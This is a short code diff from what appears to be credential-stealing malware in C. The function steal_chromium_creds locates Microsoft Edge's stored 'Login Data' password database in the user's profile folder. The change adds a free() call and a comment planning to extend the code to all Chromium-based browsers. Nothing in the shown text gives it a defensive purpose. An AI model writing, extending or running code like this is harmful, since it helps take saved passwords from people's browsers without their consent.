@@ -15,6 +15,8 @@ int steal_chromium_creds() {
   // Retrieve the path to the APPDATA directory
   hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appDataPath);
   if (SUCCEEDED(hr)) {
+    // Should be a parameter later so that we can do all chromium based
+    // browsers
     const wchar_t *additionalPath =
         L"\\Microsoft\\Edge\\User Data\\Default\\Login Data";
 
@@ -28,6 +30,7 @@ int steal_chromium_creds() {
       wcscat(fullPath, additionalPath);
 
       wprintf(L"Full path: %ls\n", fullPath);
+      free(fullPath);
     }
 
     // Free the memory allocated by SHGetKnownFolderPath
